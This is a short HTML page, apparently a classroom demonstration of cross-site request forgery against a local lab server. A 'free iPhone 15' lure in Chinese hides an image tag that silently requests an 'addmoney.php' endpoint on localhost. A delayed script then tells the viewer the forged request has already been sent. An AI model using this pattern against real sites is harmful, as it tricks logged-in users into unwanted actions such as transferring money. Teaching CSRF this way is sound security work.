<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>惡意頁面</title>
</head>
<body>
    <h1>🔥 恭喜你獲得免費 iPhone 15！</h1>
    <p>正在為您處理中...</p>

    <img src="http://localhost:8080/csrf/addmoney.php" 
    
     alt="attack">

    <script>
        // 為了方便觀察，我們延遲一點時間後告訴你發生了什麼事
        setTimeout(function() {
            document.body.insertAdjacentHTML('beforeend', '<p style="color:red">（其實剛剛瀏覽器已經偷偷對 addmoney.php 發出請求了...）</p>');
        }, 1000);
    </script>
</body>
</html>